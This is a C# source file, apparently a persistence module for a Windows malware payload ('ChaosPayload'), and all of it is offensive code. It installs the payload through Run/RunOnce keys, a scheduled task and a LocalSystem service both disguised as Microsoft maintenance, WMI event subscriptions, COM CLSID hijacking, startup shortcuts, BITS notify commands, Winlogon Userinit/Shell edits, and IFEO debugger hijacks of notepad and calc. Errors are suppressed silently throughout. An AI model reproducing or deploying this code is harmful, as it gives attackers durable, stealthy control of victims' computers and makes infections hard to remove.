// =====================================================================
// PERSISTENCE MODULE
// =====================================================================
// Drop-in module for PayloadSource_v2.cs
// Features:
// - Run/RunOnce registry keys
// - Scheduled Tasks (multiple triggers)
// - WMI Event Subscriptions (permanent, stealthy)
// - COM Hijacking (CLSID, ProgID, AppInit)
// - Service Installation (auto-start, recovery)
// - Startup Folder shortcuts
// - BITS Jobs
// - Winlogon Userinit/Shell
// - Image File Execution Options (IFEO)
// - Service Recovery
// - Boot/Logon Autostart

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.ServiceProcess;
using System.Threading.Tasks;

internal static class Persistence
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool CopyFile(string lpExistingFileName, string lpNewFileName, bool bFailIfExists);

    [DllImport("shell32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern IntPtr SHGetFolderLocation(IntPtr hwnd, int csidl, IntPtr hToken, uint dwFlags, out IntPtr ppidl);

    [DllImport("shell32.dll", CharSet = CharSet.Auto)]
    private static extern bool SHGetPathFromIDList(IntPtr pidl, StringBuilder pszPath);

    private const int CSIDL_STARTUP = 0x0007;
    private const int CSIDL_COMMON_STARTUP = 0x001A;

    public static async Task<bool> InstallPersistence()
    {
        if (!Config.PersistenceEnabled) return false;

        bool anySuccess = false;
        string payloadPath = GetPayloadPath();
        string payloadName = Path.GetFileNameWithoutExtension(payloadPath);

        try
        {
            // 1. Registry Run Keys (most common, reliable)
            if (Config.PersistenceMethods.Contains("run_key"))
                anySuccess |= InstallRunKey(payloadPath, payloadName);

            if (Config.PersistenceMethods.Contains("runonce_key"))
                anySuccess |= InstallRunOnceKey(payloadPath, payloadName);

            // 2. Scheduled Tasks (flexible triggers)
            if (Config.PersistenceMethods.Contains("scheduled_task"))
                anySuccess |= await InstallScheduledTask(payloadPath, payloadName);

            // 3. WMI Event Subscription (stealthy, survives reboots)
            if (Config.PersistenceMethods.Contains("wmi_event"))
                anySuccess |= await InstallWmiEventSubscription(payloadPath, payloadName);

            // 4. COM Hijacking
            if (Config.PersistenceMethods.Contains("com_hijack"))
                anySuccess |= InstallComHijack(payloadPath, payloadName);

            // 5. Service Installation (requires admin)
            if (Config.PersistenceMethods.Contains("service"))
                anySuccess |= await InstallService(payloadPath, payloadName);

            // 6. Startup Folder
            if (Config.PersistenceMethods.Contains("startup_folder"))
                anySuccess |= InstallStartupFolder(payloadPath, payloadName);

            // 7. BITS Jobs (background intelligent transfer)
            if (Config.PersistenceMethods.Contains("bits_job"))
                anySuccess |= await InstallBitsJob(payloadPath, payloadName);

            // 8. Winlogon
            if (Config.PersistenceMethods.Contains("winlogon"))
                anySuccess |= InstallWinlogon(payloadPath, payloadName);

            // 9. IFEO (Image File Execution Options)
            if (Config.PersistenceMethods.Contains("ifeo"))
                anySuccess |= InstallIfeo(payloadName);

            // 10. Service Recovery
            if (Config.PersistenceMethods.Contains("service_recovery"))
                anySuccess |= InstallServiceRecovery(payloadPath, payloadName);
        }
        catch { }

        return anySuccess;
    }

    // ============ REGISTRY RUN KEYS ============
    private static bool InstallRunKey(string payloadPath, string name)
    {
        try
        {
            string keyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(keyPath))
            {
                key.SetValue(name, $"\"{payloadPath}\"");
            }
            return true;
        }
        catch { return false; }
    }

    private static bool InstallRunOnceKey(string payloadPath, string name)
    {
        try
        {
            string keyPath = @"Software\Microsoft\Windows\CurrentVersion\RunOnce";
            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(keyPath))
            {
                key.SetValue(name, $"\"{payloadPath}\"");
            }
            return true;
        }
        catch { return false; }
    }

    // ============ SCHEDULED TASKS ============
    private static async Task<bool> InstallScheduledTask(string payloadPath, string name)
    {
        try
        {
            using (var taskService = new TaskService())
            {
                var task = taskService.NewTask();
                task.RegistrationInfo.Description = "Windows System Maintenance";
                task.RegistrationInfo.Author = "Microsoft Corporation";

                // Multiple triggers for resilience
                var triggers = new List<Trigger>
                {
                    new LogonTrigger { UserId = WindowsIdentity.GetCurrent().Name },
                    new BootTrigger(),
                    new DailyTrigger { StartBoundary = DateTime.Now.AddMinutes(5), DaysInterval = 1 },
                    new IdleTrigger(),
                };

                foreach (var trigger in triggers)
                    task.Triggers.Add(trigger);

                var execAction = new ExecAction(payloadPath, null, Path.GetDirectoryName(payloadPath));
                task.Actions.Add(execAction);

                task.Settings.AllowHardTerminate = true;
                task.Settings.StartWhenAvailable = true;
                task.Settings.RunOnlyIfNetworkAvailable = false;
                task.Settings.DisallowStartIfOnBatteries = false;
                task.Settings.StopIfGoingOnBatteries = false;
                task.Settings.ExecutionTimeLimit = TimeSpan.Zero;
                task.Settings.Priority = ProcessPriorityClass.BelowNormal;

                string taskName = $"Microsoft\\Windows\\System\\{name}";
                taskService.RootFolder.RegisterTaskDefinition(taskName, task, TaskCreation.CreateOrUpdate, null, null, TaskLogonType.InteractiveToken);
                return true;
            }
        }
        catch { return false; }
    }

    // ============ WMI EVENT SUBSCRIPTION ============
    private static async Task<bool> InstallWmiEventSubscription(string payloadPath, string name)
    {
        try
        {
            var scope = new ManagementScope(@"root\cimv2");
            scope.Connect();

            // 1. Create __EventFilter
            var filterClass = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
            var filter = filterClass.CreateInstance();
            filter["Name"] = $"WinMaintenance_{name}";
            filter["Query"] = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'";
            filter["QueryLanguage"] = "WQL";
            filter["EventNamespace"] = "root\\cimv2";
            filter.Put();

            // 2. Create CommandLineEventConsumer
            var consumerClass = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null);
            var consumer = consumerClass.CreateInstance();
            consumer["Name"] = $"WinMaintenanceConsumer_{name}";
            consumer["CommandLineTemplate"] = $"\"{payloadPath}\"";
            consumer["RunInteractively"] = false;
            consumer.Put();

            // 3. Create Binding
            var bindingClass = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null);
            var binding = bindingClass.CreateInstance();
            binding["Filter"] = filter.Path;
            binding["Consumer"] = consumer.Path;
            binding.Put();

            // Alternative: Timer-based filter
            var timerFilter = filterClass.CreateInstance();
            timerFilter["Name"] = $"WinMaintenanceTimer_{name}";
            timerFilter["Query"] = "SELECT * FROM __TimerEvent WHERE TimerId = 'WinMaintenanceTimer'";
            timerFilter["QueryLanguage"] = "WQL";
            timerFilter["EventNamespace"] = "root\\cimv2";
            timerFilter.Put();

            // Create timer
            var timerClass = new ManagementClass(scope, new ManagementPath("__IntervalTimerInstruction"), null);
            var timer = timerClass.CreateInstance();
            timer["TimerId"] = "WinMaintenanceTimer";
            timer["IntervalBetweenEvents"] = 3600000000; // 1 hour in 100ns units
            timer["SkipIfPassed"] = false;
            timer.Put();

            var timerBinding = bindingClass.CreateInstance();
            timerBinding["Filter"] = timerFilter.Path;
            timerBinding["Consumer"] = consumer.Path;
            timerBinding.Put();

            return true;
        }
        catch { return false; }
    }

    // ============ COM HIJACKING ============
    private static bool InstallComHijack(string payloadPath, string name)
    {
        try
        {
            string dllPath = payloadPath.Replace(".exe", ".dll");
            if (!File.Exists(dllPath))
            {
                // Copy as DLL
                File.Copy(payloadPath, dllPath, true);
            }

            // Target CLSIDs that are commonly loaded
            var targets = new Dictionary<string, string>
            {
                { @"Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32", "MMDeviceEnumerator" },
                { @"Software\Classes\CLSID\{5839FCA9-774D-42A1-ACDA-D6A79037F57F}\InprocServer32", "WScript.Shell" },
                { @"Software\Classes\CLSID\{0D43FE01-F093-11CF-8940-00A0C9054228}\InprocServer32", "ShellLink" },
                { @"Software\Classes\CLSID\{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}\InprocServer32", "FileOpenDialog" },
                { @"Software\Classes\CLSID\{3AD05575-8857-4850-9277-11B85BDB8E09}\InprocServer32", "InternetExplorer" },
            };

            foreach (var kvp in targets)
            {
                try
                {
                    using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(kvp.Key))
                    {
                        if (key != null)
                        {
                            // Backup original
                            string original = key.GetValue("")?.ToString();
                            if (!string.IsNullOrEmpty(original))
                                key.SetValue("Original", original);

                            key.SetValue("", dllPath);
                            key.SetValue("ThreadingModel", "Apartment");
                        }
                    }
                }
                catch { }
            }

            return true;
        }
        catch { return false; }
    }

    // ============ SERVICE INSTALLATION ============
    private static async Task<bool> InstallService(string payloadPath, string name)
    {
        try
        {
            // Check if admin
            if (!IsAdministrator()) return false;

            string serviceName = $"WinSysMaintenance_{name}";
            string displayName = "Windows System Maintenance Service";

            // Copy to system location
            string systemPath = @"C:\Windows\System32\WinSysMaintenance.exe";
            File.Copy(payloadPath, systemPath, true);

            // Create service via SC.exe
            var psi = new ProcessStartInfo
            {
                FileName = "sc.exe",
                Arguments = $"create \"{serviceName}\" binPath= \"{systemPath}\" DisplayName= \"{displayName}\" start= auto obj= \"LocalSystem\"",
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            Process.Start(psi)?.WaitForExit();

            // Set recovery actions
            Process.Start("sc.exe", $"failure \"{serviceName}\" reset= 60 actions= restart/1000/restart/1000/run/1000")?.WaitForExit();

            // Start service
            Process.Start("sc.exe", $"start \"{serviceName}\"")?.WaitForExit();

            return true;
        }
        catch { return false; }
    }

    // ============ STARTUP FOLDER ============
    private static bool InstallStartupFolder(string payloadPath, string name)
    {
        try
        {
            // Current user startup
            IntPtr pidl;
            SHGetFolderLocation(IntPtr.Zero, CSIDL_STARTUP, IntPtr.Zero, 0, out pidl);
            var sb = new StringBuilder(260);
            SHGetPathFromIDList(pidl, sb);
            string userStartup = sb.ToString();

            string shortcutPath = Path.Combine(userStartup, $"{name}.lnk");
            CreateShortcut(payloadPath, shortcutPath, "Windows System Maintenance");

            // All users startup (if admin)
            if (IsAdministrator())
            {
                SHGetFolderLocation(IntPtr.Zero, CSIDL_COMMON_STARTUP, IntPtr.Zero, 0, out pidl);
                sb.Clear();
                SHGetPathFromIDList(pidl, sb);
                string commonStartup = sb.ToString();

                shortcutPath = Path.Combine(commonStartup, $"{name}.lnk");
                CreateShortcut(payloadPath, shortcutPath, "Windows System Maintenance");
            }

            return true;
        }
        catch { return false; }
    }

    private static void CreateShortcut(string targetPath, string shortcutPath, string description)
    {
        // Using COM to create shortcut
        Type shellType = Type.GetTypeFromProgID("WScript.Shell");
        object shell = Activator.CreateInstance(shellType);
        object shortcut = shell.GetType().InvokeMember("CreateShortcut", System.Reflection.BindingFlags.InvokeMethod, null, shell, new object[] { shortcutPath });
        shortcut.GetType().InvokeMember("TargetPath", System.Reflection.BindingFlags.SetProperty, null, shortcut, new object[] { targetPath });
        shortcut.GetType().InvokeMember("Description", System.Reflection.BindingFlags.SetProperty, null, shortcut, new object[] { description });
        shortcut.GetType().InvokeMember("Save", System.Reflection.BindingFlags.InvokeMethod, null, shortcut, null);
    }

    // ============ BITS JOBS ============
    private static async Task<bool> InstallBitsJob(string payloadPath, string name)
    {
        try
        {
            // BITS can execute commands on job completion
            // Create a job that downloads a file and executes it
            string jobName = $"WindowsUpdate_{name}";
            
            var psi = new ProcessStartInfo
            {
                FileName = "bitsadmin.exe",
                Arguments = $"/create /download /priority FOREGROUND \"{jobName}\" \"http://localhost/fake\" \"{Path.GetTempPath()}{name}.tmp\"",
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            Process.Start(psi)?.WaitForExit();

            // Set notification command
            Process.Start("bitsadmin.exe", $"/setnotifycmdline \"{jobName}\" \"{payloadPath}\" \"\"")?.WaitForExit();
            Process.Start("bitsadmin.exe", $"/resume \"{jobName}\"")?.WaitForExit();

            return true;
        }
        catch { return false; }
    }

    // ============ WINLOGON ============
    private static bool InstallWinlogon(string payloadPath, string name)
    {
        try
        {
            // Requires admin
            if (!IsAdministrator()) return false;

            // Userinit
            using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
            {
                if (key != null)
                {
                    string userinit = key.GetValue("Userinit")?.ToString() ?? @"C:\Windows\system32\userinit.exe,";
                    if (!userinit.Contains(payloadPath))
                    {
                        key.SetValue("Userinit", userinit + $"\"{payloadPath}\",");
                    }
                }
            }

            // Shell (more aggressive)
            using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
            {
                if (key != null)
                {
                    string shell = key.GetValue("Shell")?.ToString() ?? "explorer.exe";
                    if (!shell.Contains(payloadPath))
                    {
                        key.SetValue("Shell", $"explorer.exe, \"{payloadPath}\"");
                    }
                }
            }

            return true;
        }
        catch { return false; }
    }

    // ============ IFEO (IMAGE FILE EXECUTION OPTIONS) ============
    private static bool InstallIfeo(string name)
    {
        try
        {
            // Requires admin
            if (!IsAdministrator()) return false;

            // Hijack common executables
            string[] targets = { "notepad.exe", "calc.exe", "mspaint.exe", "write.exe", "wordpad.exe" };

            foreach (string target in targets)
            {
                string keyPath = $@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{target}";
                using (var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(keyPath))
                {
                    if (key != null)
                    {
                        string payloadPath = GetPayloadPath();
                        key.SetValue("Debugger", $"\"{payloadPath}\"");
                    }
                }
            }

            return true;
        }
        catch { return false; }
    }

    // ============ SERVICE RECOVERY ============
    private static bool InstallServiceRecovery(string payloadPath, string name)
    {
        try
        {
            if (!IsAdministrator()) return false;

            // Find services we can modify recovery for
            var services = ServiceController.GetServices();
            foreach (var svc in services)
            {
                try
                {
                    // Only modify non-critical services
                    if (svc.Status != ServiceControllerStatus.Running) continue;
                    
                    string serviceName = svc.ServiceName;
                    if (serviceName.StartsWith("Win") || serviceName.Contains("Update") || serviceName.Contains("Maintenance"))
                    {
                        Process.Start("sc.exe", $"failure \"{serviceName}\" reset= 60 actions= run/1000")?.WaitForExit();
                        
                        // Set the recovery command
                        string recoveryCmd = $"\"{payloadPath}\"";
                        // This would require registry modification of the service's FailureActions
                    }
                }
                catch { }
            }
            return true;
        }
        catch { return false; }
    }

    // ============ HELPERS ============
    private static bool IsAdministrator()
    {
        try
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        catch { return false; }
    }

    private static string GetPayloadPath()
    {
        return Process.GetCurrentProcess().MainModule?.FileName ?? @"C:\Windows\Temp\ChaosPayload.exe";
    }
}

internal static partial class Config
{
    public static bool PersistenceEnabled = true;
    public static List<string> PersistenceMethods = new List<string>
    {
        "run_key",
        "runonce_key",
        "scheduled_task",
        "wmi_event",
        "com_hijack",
        "service",
        "startup_folder",
        "bits_job",
        "winlogon",
        "ifeo",
        "service_recovery",
    };
}